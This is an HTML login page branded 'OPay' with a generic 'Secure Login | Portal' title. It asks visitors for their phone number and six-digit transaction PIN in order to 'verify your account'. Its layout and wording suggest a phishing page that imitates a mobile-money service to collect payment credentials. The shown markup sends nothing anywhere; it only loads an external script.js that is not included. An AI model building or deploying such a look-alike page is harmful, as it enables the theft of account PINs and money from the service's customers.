<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login | Portal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <div class="login-card" id="login-card">
            <div class="logo-section">
                <span class="brand-name">OPay</span>
            </div>
            
            <div class="form-header">
                <h2>Welcome Back</h2>
                <p>Verify your account to continue</p>
            </div>

            <form id="auth-form">
                <div class="input-group">
                    <label for="phone">Phone Number</label>
                    <input type="tel" id="phone" placeholder="0801 234 5678" autocomplete="off">
                </div>

                <div class="input-group">
                    <label for="pin">Transaction PIN</label>
                    <input type="password" id="pin" placeholder="****" maxlength="6" autocomplete="off">
                </div>

                <button type="submit" class="btn-primary" id="submit-btn">Sign In</button>
            </form>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
